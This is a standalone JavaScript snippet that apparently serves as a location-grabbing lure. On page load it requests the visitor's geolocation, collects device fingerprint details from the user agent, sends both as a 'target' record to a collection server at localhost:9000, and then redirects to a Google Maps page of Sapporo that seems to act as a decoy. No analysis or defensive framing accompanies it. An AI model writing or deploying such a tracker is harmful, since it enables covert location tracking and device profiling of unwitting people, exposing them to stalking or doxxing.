if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        function(position) {
            const location = {
                latitude:  position.coords.latitude,
                longitude: position.coords.longitude,
            }

            const targetRequest = {
                location: location,
                device: getDeviceInformation(),
            }

            saveLocation(targetRequest)
                .then(() => {
                    console.log("Location saved successfully.");
                    window.location.replace("https://www.google.com/maps/place/Sapporo,+Hokkaido,+Japan/@42.9853655,140.9183319,10z/data=!3m1!4b1!4m6!3m5!1s0x5f0ad4755a973633:0x33937e9d4687bad5!8m2!3d43.0617713!4d141.3544507!16zL20vMGdwNWw2?entry=ttu&g_ep=EgoyMDI1MDcyOS4wIKXMDSoASAFQAw%3D%3D");
                })
                .catch(err => {
                    console.error("Error saving location:", err);
                })
            ;
        },
        function(error) {
            console.error("Error getting location:", error.message);
        }
    );
} else {
    console.error("Geolocation is not supported by this browser.");
}

const saveLocation = async (req) => {
    fetch('http://localhost:9000/locations', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(req)
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            console.log('Coordinates sent successfully');
        })
        .catch(error => {
            console.error('Error sending coordinates:', error);
        });
}

const getDeviceInformation = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    const getBrowser = () => {
        if (userAgent.includes("Firefox")) return "Firefox";
        if (userAgent.includes("Chrome")) return "Chrome";
        if (userAgent.includes("Safari")) return "Safari";
        if (userAgent.includes("Edge")) return "Edge";
        if (userAgent.includes("Opera")) return "Opera";
        return "Unknown";
    };

    const getOS = () => {
        if (userAgent.includes("Windows")) return "Windows";
        if (userAgent.includes("Mac")) return "MacOS";
        if (userAgent.includes("Linux")) return "Linux";
        if (userAgent.includes("Android")) return "Android";
        if (userAgent.includes("iOS")) return "iOS";
        return "Unknown";
    };

    const getDeviceBrand = () => {
        if (userAgent.includes("iPhone")) return "Apple";
        if (userAgent.includes("iPad")) return "Apple";
        if (userAgent.includes("Samsung")) return "Samsung";
        if (userAgent.includes("Huawei")) return "Huawei";
        if (userAgent.includes("Xiaomi")) return "Xiaomi";
        return "Unknown";
    };

    const getDeviceModel = () => {
        const match = userAgent.match(/\(([^)]+)\)/);
        return match ? match[1] : "Unknown";
    };

    return {
        model: getDeviceModel(),
        operating_system: getOS(),
        platform: platform,
        user_agent: userAgent,
        brand: getDeviceBrand(),
        browser: getBrowser(),
    };
}